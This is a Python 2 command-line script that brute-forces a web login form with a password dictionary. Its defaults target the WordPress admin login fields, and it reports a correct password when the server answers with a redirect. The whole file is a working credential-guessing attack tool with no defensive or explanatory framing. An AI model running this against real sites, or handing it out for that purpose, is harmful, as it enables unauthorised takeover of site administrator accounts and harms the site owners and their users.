#/bin/python
# Default is set up for a wordpress admin form
import mechanize 
import logging
import time
from optparse import OptionParser
from urllib2 import HTTPError

form_username = 'log'
form_password = 'pwd'
form_submit = 'wp-submit'


def brute_server(server, user, password_list):
  br = mechanize.Browser()
  br.set_handle_equiv(False)
  br.set_handle_redirect(False)
  br.set_handle_referer(False)
  br.set_handle_robots(False)
  br.open(server)
  pass_list = open(password_list)
  for x in pass_list.readlines():
    try:  
      time.sleep(3)
      br.select_form( nr = 0 )
      br.form[form_username] = user
      br.form[form_password] = ''.join(x)
      print "Checking ",''.join(x)
      request = br.click(name=form_submit)
      response = br.open(request)
      if response.code == 200:
        print "No dice..."
    except HTTPError, e:
      if e.code == 302: # Redirect is our success case
	    print "Correct password is ",''.join(x)

		
def main():

  # Setup the command line arguments.
  optp = OptionParser()

  # Output verbosity options
  optp.add_option('-q', '--quiet', help='set logging to ERROR',
                  action='store_const', dest='loglevel',
                  const=logging.ERROR, default=logging.INFO)
  optp.add_option('-d', '--debug', help='set logging to DEBUG',
                  action='store_const', dest='loglevel',
                  const=logging.DEBUG, default=logging.INFO)
  optp.add_option('-v', '--verbose', help='set logging to COMM',
                  action='store_const', dest='loglevel',
                  const=5, default=logging.INFO)

  # Option for target web form to brute
  optp.add_option("-t", "--target", dest="target",
                  help="The target form to brute")
				  
  # Option for username to attack
  optp.add_option("-u", "--user", dest="user",
                  help="The username field of the form")
				  
  # Option for target web form to brute
  optp.add_option("-p", "--password", dest="password",
                  help="The password list to use in the dictionary attack")
				  
  opts, args = optp.parse_args()

  if opts.target is None:
    opts.target = raw_input("What is the target page with the form: ")
	
  if opts.user is None:
    opts.user = raw_input("What is the username to brute force: ")
	
  if opts.password is None:
    opts.password = raw_input("What is the password list file to use: ")
  
  # Setup logging.
  logging.basicConfig(level=opts.loglevel,
                      format='%(levelname)-8s %(message)s')


  # Main Event Loop:
  try:
    brute_server(opts.target, opts.user, opts.password)
  
  except (KeyboardInterrupt, EOFError) as e:
    print "Exiting..."
    exit(0)
	
  print "Completed Password List!"
  
if __name__ == '__main__':
  main()
